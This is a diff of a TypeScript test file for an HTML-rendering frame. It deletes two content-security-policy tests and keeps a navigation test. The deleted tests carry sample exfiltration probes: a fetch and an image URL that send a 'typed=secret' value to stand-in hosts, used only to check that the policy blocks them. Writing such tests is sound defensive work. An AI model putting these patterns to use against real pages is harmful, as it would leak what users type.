@@ -74,26 +74,7 @@ function mountPage(page: string, keep = false) {
   return seen;
 }
 
-const REPORT_VIOLATIONS = `document.addEventListener('securitypolicyviolation', (e) => parent.postMessage({ probe: 'csp', directive: e.effectiveDirective }, '*'));`;
-
-describe('html-render page policy', () => {
-  // Violation events, not failed requests: CI may have no network, and only the policy names the directive.
-  it("blocks the page's own fetch, so what a reader types cannot be sent anywhere", async () => {
-    const seen = mountPage(`<script>${REPORT_VIOLATIONS}
-fetch('https://example.org/collect?typed=secret').then(() => parent.postMessage({ probe: 'sent' }, '*'), () => parent.postMessage({ probe: 'rejected' }, '*'));
-</script>`);
-    await until('the page reports its fetch', () => seen.some((m) => m.probe === 'rejected' || m.probe === 'sent'));
-    await until('the policy reports the violation', () => seen.some((m) => m.probe === 'csp'));
-    expect(seen.find((m) => m.probe === 'csp')?.directive).toBe('connect-src');
-    expect(seen.some((m) => m.probe === 'sent')).toBe(false);
-  });
-
-  it('blocks an image from a host outside the three CDNs, so a URL cannot carry it either', async () => {
-    const seen = mountPage(`<script>${REPORT_VIOLATIONS}</script><img src="https://example.com/x.png?typed=secret">`);
-    await until('the policy reports the image', () => seen.some((m) => m.probe === 'csp'));
-    expect(seen.find((m) => m.probe === 'csp')?.directive).toBe('img-src');
-  });
-
+describe('html-render page', () => {
   it('puts a frame that navigated away back on its own page', async () => {
     // Each load says hello, then leaves; a second hello means the frame came back to the page.
     const seen = mountPage(`<script>parent.postMessage({ probe: 'hello' }, '*'); setTimeout(() => { location.href = 'about:blank'; }, 20);</script>`, true);
